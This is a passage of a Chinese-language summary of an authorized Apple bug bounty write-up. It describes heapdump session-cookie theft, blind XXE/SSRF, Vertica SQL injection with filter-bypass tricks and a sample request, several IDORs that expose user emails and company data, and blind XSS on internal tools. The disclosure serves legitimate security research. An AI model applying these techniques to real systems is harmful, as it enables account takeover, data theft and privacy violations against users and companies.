這些 mappings 展示了所有的 Web 路由
- 包括位於主機根目錄的附加文件夾，其中包含額外的 actuator heapdumps
- 正是在這一點上，我們意識到 actuator endpoints 在所有 `esign subdomains` 的每個  app folder 中都存在漏洞
- 從這裡我們從 `ensign-internal` 抓取了一個 heapdump

我們使用 `Eclipse Memory Analyzer` 載入 `heapdump` 並將所有字符串導出到 csv 以使用 grep 進行篩選。
 
![](https://i.imgur.com/xScEqqm.png)  

從那裡我們了解到 application’s authentication cookie 是 `acack`
- 我們在 heapdump 中搜索 acack，直到找到有效 session cookie
- 在這一點上，我們確定它是 Apple 員工令牌而不是客戶，否則我們不會對其進行測試。載入後，我們就可以訪問該 application

我們可以展示的內容不多，但這裡有一個片段顯示了頁面的經過身份驗證的圖：


![](https://i.imgur.com/hHMpEmz.png)  

這使我們能
- 夠訪問 50 多個 application endpoints，包括一些 admin endpoints
  - 例如 `setProxy`，它們很可能從內部 `SSRF` 或 `RCE`
- 我們還注意到 `acack cookie` 也在向其他 application 驗證我們的身份。

在證明了足夠的影響後，我們在這裡停下來並 report 了

Actuators exposing heapdumps public-facing 並不是什麼新鮮事
- 這是一個相對較 low-hanging 的發現，大多數 `wordlists` 都會發現
- 重要的是要記住，僅僅因為你不經常發現它們，它們仍然存在並且在等待攻擊者發現的大目標上

## 在 Java Management API 上，用 XML External Entity 實現  Blind SSRF

在測試期間
- 我們發現一個 API 具有多個未經身份驗證的 functions
- 這些 functions 在眾多 `17.0.0.0/8` 主機之一上找到的 `application.wadl` 後都使用了 `application/xml`

`application.wadl` 定義了此服務使用的 endpoints
- 這是一個通常被鎖定且無法訪問的服務的測試 instance

- 我們能夠使用 blind XXE payload 來展示 blind SSRF。

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp.png)  

由於這台機器上使用的 Java 版本已經修掉這個問題
- fully patched, preventing a 2 stage blind XXE payload
- 我們無法完全利用它來讀取這台機器上的 file 或從 SSRF 獲得 response
- 我們不知道的 XML 格式結構（防止 non-blind XXE 攻擊

這個漏洞很有趣
- 因為 Apple 嚴重依賴 XML
- 感覺我們會發現更多的 XXE instance 以及我們看到使用它的多少請求
- 利用這個方法令人驚訝，因為與我們試圖隨著時間的推移識別它的所有復雜方法相比，它非常簡單
- 因為它可以實現 blind XXE



如果我們要成功地利用它來實現讀取本地 file 或 full response SSRF
- 很可能是通過為 API 本身找到適當的 XML 格式，以便直接反映文件內容而不是實現盲目滲漏

總的來說，攻擊者可能會用它來...
- 獲取基本上是各種內部和外部員工 app 的關鍵
- 從各種 `esign.apple.com` app 揭露各種機密（database credentials, OAuth secrets, private keys）


## GBI Vertica SQL Injection and Exposed GSF API

GBI Vertica SQL 注入和暴露的 GSF API
我們最初的 recon
- 涉及所有 Apple 擁有的 domain 和 IP address 的 screenshot

我們發現了幾個看起來像這樣的服務器：


![](https://i.imgur.com/MDNTLze.png)  

從這裡開始，我們開始處理一些 application
- 例如 `/depReports`
- 我們可以對它們進行 authenticate，並通過對 `/gsf/` 路由上的 API 的 API 請求訪問一些 data
- 我們在該主機上訪問的所有 application 都通過該 GSF service 來路由請求

The request looked like the following:

```
POST /gsf/partShipment/businessareas/AppleCare/subjectareas/acservice/services/batch HTTP/1.1
Host: gbiportal-apps-external-msc.apple.com
{
    "executionType": "parallel",
    "requests": [{
        "queryName": "redacted",
        "filters": {
            "redacted_id": ["redacted"],
            "redacted": [""]
        }
    }, {
        "queryName": "redacted",
        "filters": {
            "redacted_id": ["redacted"],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": ["service_notification_number"],
            "redacted": ["desc"]
        }
    }, {
        "queryName": "redacted",
        "filters": {
            "redacted_id": ["redacted"],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": [""],
            "redacted": ["service_notification_number"],
            "redacted": ["desc"],
            "redacted": ["100"],
            "redacted": ["0"]
        }
    }]
}
```

你可以看到這裡有一些關鍵字
- 正在與 SQL 互動
- Keywords：query, limit, offset, column names, filter 等
- 改動看看會發生什麼，我們得到以下結果：


![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1.png)  

(includes column names, table name, database name, etc)  

其中，這個訊息最重要

```
exception is java.sql.SQLException: java.sql.SQLSyntaxErrorException: [Vertica][VJDBC](4856) ERROR: Syntax error at or near \"adesc\""}]}]}
```

我們最終成功 `union injection`
- 一些重要的部分是由於堆疊查詢而限制的額外 `*/*/` 結束註解
- 我們還必須在 FROM 和 table 之間使用 `/**/`，因為 vSQL 一些針對 SQL injection 的保護措施


![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1.png)  

沒有 vSQLMap，因此需要大量的手動工作來獲得有效的 injection


![](https://i.imgur.com/IkhPzKv.png)  

一旦我們開始工作，我們決定寫 script 自動化
- https://gist.github.com/ziot/3c079fb253f4e467212f2ee4ce6c33cb


如果有人對 `Vertica SQL injection` 感興趣
- 我強烈建議看他們的 document。有些有趣的功能可以用來進一步進行 injection
- https://www.vertica.com/docs/9.2.x/HTML/Content/Authoring/SQLReferenceManual/Functions/VerticaFunctions/s3export.htm


如果配置了 AWS keys
- 可以使用 SQL injection 從 seerver 拿到 key
- 在我們的例子中，這不是為 AWS 配置的，所以我們無法做到這一點
- 此時我們有足夠的資料來 report SQL injection
- 我們決定進一步探索 `/gsf/` API，因為我們認為它們可能會  ACL off this host and it would no longer be public-facing.


![](https://i.imgur.com/7zTie1a.png)  

很明顯
- GSF API 可以訪問 `GSF` module，這 module 公開了大量有關 `GSF` applets 的 data
- 包括一些 API endpoints，用於提取 cluster data、application data，甚至可能部署新的 cluster 和 application

我們推測此時我們已經能夠將內部 API 部署到該 cluster 中
- public `/gsf/`，使我們能夠訪問敏感 data
- 但是，由於存在風險，我們沒有證明這一點。我們停在這邊，report 了

總的來說，攻擊者可能會用它來...
-  可能通過公開的 GSF portal 破壞各種內部 application
- 執行任意 Vertica SQL queries 並提取 db data


## 各種 IDOR 漏洞
- (insecure direct object reference, 但在沒有完善的檢查機制與權限控管下，攻擊者有可能直接獲取到其他資訊)

在 Apple 的整個測試過程中，我們發現了影響 Apple 的各種 IDOR

### App Store Connect

註冊開發者服務後
- 我們做的第一件事就是探索 `App Store Connect` application
- 該 app 讓開發者可以管理他們已經或計劃發佈到應用商店的 application

隱藏在設置頁面的幾個超鏈接後面的是為 application 啟用遊戲中心的設置
- 這將允許為你的 application 建排行榜和管理語言環境
- 如果啟用此功能，會被導到外觀更舊的頁面，該頁面使用一組新標識符來管理你可以加到 application 中的新遊戲中心/區域設置。

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center.png)  


在 URL 中發送了一個 `itemId` 參數
- 該參數是個數值，用於定義你正在修改的 application config
- 通過修改數字，我們可以訪問和修改任何 application 的排行榜
- 這將允許攻擊者從 application 中破壞或完全刪除遊戲中心設置

總的來說，攻擊者可能會用它來...
- 查看和修改 store 中任何 application 的 meta data
- 在任何 application 的 Game Center information 頁面中更改 data

### iCloud 的 `Find my Friends` 的 IDOR

iCloud 服務有功能
- 父母可以通過他們主要的 Apple 帳號建立和管理兒童帳號
- 由於 application 中的父/子關係和權限模型，這種行為非常有趣


![](https://i.imgur.com/vEsL71l.jpg)  

如果父母建立或加了兒童帳號
- 他們將可以立即訪問以對子帳號執行某些操作
- 例如檢查孩子設備的位置、限制設備使用以及查看存照片和影片
- 用戶管理主要是通過 iOS application 完成的關係

![](https://i.imgur.com/AFPQ142.jpg)  

`Find my Friends` 有一功能
- 你可以在其中選擇你的家庭成員，然後 `Share My Location`
- 並且由於這是家庭成員之間的信任關係
- 因此無需他們接受請求即可立即與家庭成員共享你的位置並且無法從他們的 application 中刪除你的共享狀態

幸運的是
- 這個執行操作的 HTTP request 是可攔截的，我們可以看到參數的樣子

![](https://i.imgur.com/TYuiAJJ.png)  

`dsIds` JSON 參數用作用戶 ID data set 來共享你的位置
- 在 HTTP response 中，返回了家庭成員的電子郵件
- 我繼續將此值修改為另一個用戶的 ID，令我驚訝的是收到了他們的電子郵件

此 IDOR
- 將允許我們枚舉 Apple 帳號的 core identifier 以檢索客戶電子郵件
- 受害者用戶 ID 不可撤銷地共享我們的位置
- 我們可以在其中發送通知並請求訪問他們的位置
- 由於參數是通過 JSON data set 發送的，因此可以一次請求數百個，並輕鬆枚舉屬於 Apple 客戶的大量用戶 ID。

![](https://i.imgur.com/oAD5p2S.jpg)  


總的來說，攻擊者可能會用它來...
- 通過永久綁定到其帳號的 incremental numeric identifie 檢索任何 Apple 用戶的電子郵件地址
- 將攻擊者的 Apple 帳號與受害者的帳號相關聯，以便攻擊者可以向他們發送通知
- 在受害者的手機中顯示他們自己的位置，並且不會從他們的 `Find my Friends` 中刪除


### Support Case IDOR


找出要破解什麼的更具挑戰性的部分之一是攔截 iOS HTTP 流量
- 實際設備上有很多非常有趣的 application 和 API
- 但許多屬於 Apple 的 domain 都是 SSL 固定的，我們都沒有足夠強大的 mobile 背景，也​​沒有花費大量時間來拆開 iOS


人們過去已經實現了這一點，並且能夠攔截所有 HTTP 流量，但幸運的是
- 如果以某種方式設置代理，很大一部分流量仍然可以在各種 application 中被攔截。

我們這樣做的方式是
- 設置 Burp 代理，安裝證書，然後連接到啟用了 Burp 代理的 WiFi

這方面的一個例子是在
- 代理所有 HTTP request 時無法載入 core App Store
- 但能夠在不代理時載入 application，導航到你要攔截的正確子頁面，然後在該點啟用代理.

這能夠捕獲默認安裝在 iPhone 上的 Apple application 的許多 API
- 其中之一是用於 scheduling app 或 speaking with a live chat agent


通過 intercepting，來自多個 endpoints 的一些非常明顯的 IDOR 將透露有關 support case details 的 meta data
- 你能夠檢索有關受害者的 support case details（support they had requested, their device serial number, their user ID）以及一個似乎在請求與支持代理進行 live chat 時使用的 token


總的來說，攻擊者可能會用它來...
- 洩漏支持 support case metadata，例如設備序列號和 support information for all apple support cases


### mfi.apple.com 上的 IDOR

我們花了很多時間研究的另一個 application 是 `mfi.apple.com`
- 該服務專為生產與 iPhone 接口的第三方電子配件的公司的員工設計
- 以檢索文檔並為其製造過程提供支持

填寫 application 後，我們觀察到一個帶有數字 ID 參數的 HTTP request 被送到 `getReview.action`
- 我們繼續通過減/增加參數，並觀察到我們可以訪問另一家公司的 application

該 application 返回了公司 application 提供的幾乎所有值，包括姓名、電子郵件、地址和可用於加入公司的 invitation keys
- 根據我們最近的 ID 和基本 ID 進行的簡單估計表明，大約 50,000 個不同的可檢索 application 通過此漏洞。

總的來說，攻擊者可能會用它來...
- 洩露任何申請使用 Apple 的 MFi portal 的人的全部帳號 information 

## 各種 Blind XSS 漏洞


對於遇到的幾乎所有 application
- 我們都確保盡可能多送的 blind XSS payload
- 這會導致一些非常有趣的漏洞影響 application

例如
- 內部 application 中的 Employee session access，用於管理 Apple Maps address information
- 內部 application 中的 Employee session access，用於管理 Apple Books 出版商 information 
- 內部 application 中的 Employee session access，用於管理 Apple Store 和 customer support tickets

這些發現是非常典型的 blind XSS
- 因為我們通過在 address field、Apple Books submission title 以及 lastly our first and last name paylod 來發現它們


內部 application 非常有趣
- 並且似乎都具有高的訪問級別，因為它們是 context of Apple employee management tools
- 我們能夠 manage user and system information

圖顯示了我們能夠通過 XSS Hunter、screenshots 編輯的面板：

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-1024x614.png)  
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-1024x671.png)  
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1024x517.png)  
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-1024x667.png)  

由於 application 是內部的，而且我們不是真正的攻擊者
- 因此我們在每次發現時都停在這裡
- 這些 application 至少可以讓攻擊者洩露大量有關 Apple 內部物流和員工/用戶的敏感資料

## 結論

當我們第一次開始這個時
- 我們不知道我們會花費三個多月的時間來完成它
- 這原本是一個我們每隔一段時間就會進行一次的 sub project
- 但是由於 covid 的所有額外空閒時間，我們每個人最終都投入了幾百個小時。


總體而言，Apple 對我們的報告非常敏感
- 我們更重要的報告的周轉時間從提交時間到補救時間只有四個小時

由於沒有人真正了解他們的 BB
- 因此我們投入瞭如此大的時間投入，幾乎進入了未知領域
- Apple 與安全研究人員合作的歷史很有趣

他們的 bug bounty program 是朝著與黑客合作保護資產並允許有興趣的人發現和報告漏洞的正確方向邁出的一大步。

老實說，我們發現的每個錯誤都可能已經變成了一個完整的文章
- 其中包含有多少隨機 information
- Apple 使用的身份驗證系統相當複雜，用 1-2 句話引用它感覺就像我們在欺騙
- 對於 Apple 基礎架構中的許多元素，例如 iCloud、Apple 商店和開發者平台，也可以這樣說。


截至目前，10 月 8 日
- 我們已收到 32 筆針對各種漏洞的付款，總計 288,500 美元。
- 蘋果似乎分批付款，並且可能會在接下來的幾個月內支付更多的問題


我們已獲得 Apple 安全團隊 (product-security@apple.com) 的許可，可以發布此內容
- 並由他們自行決定。此處披露的所有漏洞均已修復和重新測試
- 未經 Apple 許可，請勿披露與 Apple 安全相關的 information 。
